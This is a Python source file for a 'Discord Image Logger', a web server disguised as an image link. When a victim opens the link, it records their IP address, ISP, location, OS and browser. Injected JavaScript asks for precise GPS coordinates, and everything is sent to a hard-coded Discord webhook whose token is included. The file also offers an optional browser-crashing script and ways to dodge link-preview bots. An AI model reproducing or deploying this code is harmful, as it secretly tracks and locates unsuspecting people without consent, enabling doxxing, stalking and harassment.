from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Image Logger"
__description__ = "IP _ IMAGE _ LOGGER _ FOR _ DISCORD"
__version__ = "v4.0"
__author__ = "Kil1l"

config = {
    "webhook": "https://discord.com/api/webhooks/1475545376525127752/UxOYdi9QjmgyDjP4WKK6jEJ4NYP8dEyp5BSxAXOyNuXEUaDREEVclF5cvqNzPor7jrjp",
    "image": "data:image/jpeg;base64,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", 
                                          
    "imageArgument": True, 

    "username": "Image Logger", 
    "color": 0x000000, 

    "crashBrowser": False, 
    "accurateLocation": True, 

    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/FSOCIETYTTKil1l", 
        "richMessage": True, 
    },

    "vpnCheck": 1, 

    "linkAlerts": True, 
    "buggedImage": True, 

    "antiBot": 1, 
    
    "redirect": {
        "redirect": False, 
        "page": "https://your-link.here" 
    },
}

blacklistedIPs = ("27", "104", "143", "164") 
                                                           
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None 
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) 
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() 

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) 

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) 
                self.send_header('Content-type', datatype) 
                self.end_headers() 

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
